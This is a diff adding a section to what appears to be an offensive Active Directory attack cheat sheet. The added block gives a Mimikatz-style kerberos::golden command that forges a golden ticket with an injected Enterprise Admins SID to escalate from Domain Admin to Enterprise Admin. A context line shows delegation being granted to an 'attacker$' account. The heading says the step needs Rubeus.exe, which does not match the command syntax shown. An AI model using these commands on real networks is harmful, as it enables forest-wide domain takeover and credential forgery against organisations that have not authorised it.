@@ -312,6 +312,14 @@ Set-ADComputer INTERNAL-BATCH -PrincipalsAllowedToDelegateToAccount attacker$ -V
 ```
 
 &nbsp;
+
+**[+] DA to EA (Need Rubeus.exe)**
+
+```powershell
+kerberos::golden /domain:internal.msp.local /user:administrator /sid:S-1-5-21-2754435719-1041067879-922430489 /krbtgt:c5915aaXXXXXXXXX /sids:S-1-5-21-2998733414-582960673-4099777928-519 /ptt
+```
+
+&nbsp;
 &nbsp;
 
 ## Pass the hash
